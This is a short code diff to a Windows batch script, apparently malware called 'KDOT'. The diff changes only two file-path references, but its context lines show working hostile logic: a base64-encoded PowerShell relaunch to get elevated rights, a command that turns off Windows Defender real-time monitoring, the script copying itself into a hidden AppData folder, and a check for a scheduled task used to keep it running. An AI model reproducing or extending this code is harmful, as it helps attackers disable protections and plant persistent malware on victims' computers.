@@ -7,7 +7,7 @@ if %errorlevel% == 0 goto begin
 
 :no_uac
 cd %userprofile%\AppData\Local\Temp
-powershell $command = 'Start-Process %~f0'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt
+powershell $command = 'Start-Process %~f0%'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt
 set /p base64code=<%userprofile%\AppData\Local\Temp\test.txt
 del %userprofile%\AppData\Local\Temp\test.txt
 echo $code = "%base64code%" > %userprofile%\AppData\Local\Temp\penis.ps1
@@ -21,7 +21,7 @@ exit
 PowerShell Set-MpPreference -DisableRealtimeMonitoring 1
 if not exist %localappdata%\KDOT (
     mkdir %localappdata%\KDOT
-    COPY %~f0 %localappdata%\KDOT\KDOT.bat
+    COPY %~f0% %localappdata%\KDOT\KDOT.bat
 )
 SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
 if %errorlevel% equ 0 goto info
